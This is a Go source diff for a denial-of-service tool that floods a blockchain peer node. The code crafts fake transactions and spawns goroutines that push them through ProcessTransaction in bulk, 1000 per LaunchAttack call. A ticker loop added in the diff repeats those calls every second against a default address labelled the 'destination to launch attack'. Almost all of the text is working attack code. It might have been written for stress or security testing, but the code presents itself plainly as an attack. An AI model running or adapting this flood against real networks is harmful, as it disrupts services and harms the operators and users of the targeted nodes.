@@ -92,7 +92,7 @@ func WarnningMsg() string{
         return str
 }
 
-func LaunchAttack(n int, address string){
+func LaunchAttack(n int, address string, tx *pb.Transaction){
 	c := make(chan int)		       //main exit after all go rutines were lanuched
 	con, err := peer.NewPeerClientConnectionWithAddress(address)
 	if err != nil {
@@ -101,7 +101,6 @@ func LaunchAttack(n int, address string){
 
 	defer con.Close()
 	client := pb.NewPeerClient(con)
-	before := time.Now()
 	for i := 0 ; i < n ; i++ {
 	   go func(){
 		_, _ = client.ProcessTransaction(context.Background(), tx)
@@ -113,6 +112,7 @@ func LaunchAttack(n int, address string){
 		s += <-c
 	}
 
+
 }//
 
 
@@ -122,11 +122,12 @@ func main() {
 	var chaincodeName     string
 	var timeout           int
 	var dest	      string
-
+	a := make(chan int)
 	flag.StringVar(&chaincodeName, "n", "", "Name of chaincode returned by the deploy transaction")
 	flag.IntVar(&numOfTransactions, "t", 1, "Number of transaction readly to send(dafault=1)")
-	flag.IntVar(&timeout, "timeout", 0, "fake transaction duration")
-	flat.StringVar(&des, "d","172.22.28.134:7051", "destination to launch attack")
+	flag.IntVar(&timeout, "timeout", 1, "fake transaction duration")
+	flag.StringVar(&dest, "d","172.22.28.134:7051", "destination to launch attack")
+
 
 	Init()					//viper init
 	err := initViper.SetConfig()
@@ -138,4 +139,28 @@ func main() {
 
 	tx := MakeFakeTx(chaincodeName,[]string{"a","b","1"})
 
+	ticker := time.NewTicker(time.Second)
+	now := time.Now()
+	end := now.Add(time.Second * time.Duration(timeout))
+	for tmp := now ; tmp.Before(end) ; {
+		select {
+			case <-ticker.C:
+				for i:= 0 ; i < numOfTransactions ; i++ {
+					go func(){
+						LaunchAttack(1000, dest, tx)
+						a <-1
+						}()
+				}
+				for sum := 0; sum < numOfTransactions; {
+						sum += <-a
+				}
+
+			default:
+		}
+
+
+		tmp = time.Now()
+	}
+	ticker.Stop()
+	fmt.Println("Launch attack compelete")
 }
